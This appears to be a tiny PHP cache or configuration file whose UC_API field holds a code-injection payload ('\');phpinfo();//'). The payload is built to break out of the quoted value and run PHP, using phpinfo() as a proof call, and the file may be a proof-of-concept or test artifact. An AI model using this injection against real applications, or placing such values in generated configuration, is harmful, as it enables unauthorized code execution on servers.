<?php
$_CACHE['apps'] = array (
  'UC_API' => '\');phpinfo();//',
);
